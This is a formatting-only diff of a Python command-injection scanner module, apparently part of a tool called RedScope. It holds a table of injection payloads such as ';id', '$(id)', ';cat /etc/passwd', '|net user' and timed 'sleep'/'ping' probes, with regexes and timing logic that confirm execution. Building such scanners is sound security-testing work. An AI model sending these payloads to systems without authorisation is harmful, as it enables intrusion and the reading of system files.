@@ -1,44 +1,76 @@
 import re
 import time
 from typing import List, Optional
-from urllib.parse import urlparse, parse_qs
+from urllib.parse import parse_qs, urlparse
 
 import requests
 
-from core.base_module import BaseModule, ScanResult, Finding
+from core.base_module import BaseModule, Finding, ScanResult
 
 CMDI_PARAMS = [
-    "cmd", "exec", "command", "execute", "ping", "query", "jump",
-    "code", "reg", "do", "func", "arg", "option", "load", "process",
-    "step", "read", "feature", "exe", "module", "payload", "run",
-    "daemon", "upload", "dir", "ip", "host", "target", "to", "from",
-    "search", "q", "input", "test", "id", "name", "user",
+    "cmd",
+    "exec",
+    "command",
+    "execute",
+    "ping",
+    "query",
+    "jump",
+    "code",
+    "reg",
+    "do",
+    "func",
+    "arg",
+    "option",
+    "load",
+    "process",
+    "step",
+    "read",
+    "feature",
+    "exe",
+    "module",
+    "payload",
+    "run",
+    "daemon",
+    "upload",
+    "dir",
+    "ip",
+    "host",
+    "target",
+    "to",
+    "from",
+    "search",
+    "q",
+    "input",
+    "test",
+    "id",
+    "name",
+    "user",
 ]
 
 # (payload, expected_output_pattern, technique)
 DETECTION_PAYLOADS = [
     # Output-based — Unix
-    (";id",               r"uid=\d+.*gid=\d+",    "unix-output"),
-    ("&&id",              r"uid=\d+.*gid=\d+",    "unix-output"),
-    ("|id",               r"uid=\d+.*gid=\d+",    "unix-output"),
-    ("`id`",              r"uid=\d+.*gid=\d+",    "unix-output"),
-    ("$(id)",             r"uid=\d+.*gid=\d+",    "unix-output"),
-    (";whoami",           r"root|www-data|apache|nginx|nobody", "unix-output"),
-    ("&&whoami",          r"root|www-data|apache|nginx|nobody", "unix-output"),
-    ("|whoami",           r"root|www-data|apache|nginx|nobody", "unix-output"),
-    (";cat /etc/passwd",  r"root:.*:0:0:",         "unix-file-read"),
-    ("&&cat /etc/passwd", r"root:.*:0:0:",         "unix-file-read"),
+    (";id", r"uid=\d+.*gid=\d+", "unix-output"),
+    ("&&id", r"uid=\d+.*gid=\d+", "unix-output"),
+    ("|id", r"uid=\d+.*gid=\d+", "unix-output"),
+    ("`id`", r"uid=\d+.*gid=\d+", "unix-output"),
+    ("$(id)", r"uid=\d+.*gid=\d+", "unix-output"),
+    (";whoami", r"root|www-data|apache|nginx|nobody", "unix-output"),
+    ("&&whoami", r"root|www-data|apache|nginx|nobody", "unix-output"),
+    ("|whoami", r"root|www-data|apache|nginx|nobody", "unix-output"),
+    (";cat /etc/passwd", r"root:.*:0:0:", "unix-file-read"),
+    ("&&cat /etc/passwd", r"root:.*:0:0:", "unix-file-read"),
     # Output-based — Windows
-    ("|whoami",           r"nt authority|system|administrator", "win-output"),
-    ("&whoami",           r"nt authority|system|administrator", "win-output"),
-    (";dir",              r"Directory of|Volume in drive",      "win-output"),
-    ("&&dir C:\\",        r"Directory of|Volume in drive",      "win-output"),
-    ("|net user",         r"User accounts for",                 "win-output"),
+    ("|whoami", r"nt authority|system|administrator", "win-output"),
+    ("&whoami", r"nt authority|system|administrator", "win-output"),
+    (";dir", r"Directory of|Volume in drive", "win-output"),
+    ("&&dir C:\\", r"Directory of|Volume in drive", "win-output"),
+    ("|net user", r"User accounts for", "win-output"),
     # Blind time-based — Unix
-    (";sleep 5",          None, "unix-time"),
-    ("&&sleep 5",         None, "unix-time"),
-    ("|sleep 5",          None, "unix-time"),
-    ("$(sleep 5)",        None, "unix-time"),
+    (";sleep 5", None, "unix-time"),
+    ("&&sleep 5", None, "unix-time"),
+    ("|sleep 5", None, "unix-time"),
+    ("$(sleep 5)", None, "unix-time"),
     # Blind time-based — Windows
     ("&ping -n 5 127.0.0.1", None, "win-time"),
     ("|ping -n 5 127.0.0.1", None, "win-time"),
@@ -49,7 +81,9 @@ TIME_THRESHOLD = 4.0  # seconds above baseline to confirm time-based
 
 class Module(BaseModule):
     name = "cmdi"
-    description = "Command injection scanner — output-based and time-based blind detection"
+    description = (
+        "Command injection scanner — output-based and time-based blind detection"
+    )
     author = "RedScope"
     version = "1.0.0"
 
@@ -91,12 +125,16 @@ class Module(BaseModule):
 
     def _baseline(self, session, base_url, param, timeout) -> float:
         try:
-            resp = session.get(base_url, params={param: "1"}, timeout=timeout, verify=False)
+            resp = session.get(
+                base_url, params={param: "1"}, timeout=timeout, verify=False
+            )
             return resp.elapsed.total_seconds()
         except Exception:
             return 1.0
 
-    def _test_output_based(self, session, base_url, param, timeout) -> Optional[Finding]:
+    def _test_output_based(
+        self, session, base_url, param, timeout
+    ) -> Optional[Finding]:
         for payload, pattern, technique in DETECTION_PAYLOADS:
             if pattern is None:
                 continue
@@ -140,7 +178,9 @@ class Module(BaseModule):
                 continue
         return None
 
-    def _test_time_based(self, session, base_url, param, timeout, baseline: float) -> Optional[Finding]:
+    def _test_time_based(
+        self, session, base_url, param, timeout, baseline: float
+    ) -> Optional[Finding]:
         for payload, pattern, technique in DETECTION_PAYLOADS:
             if pattern is not None:
                 continue
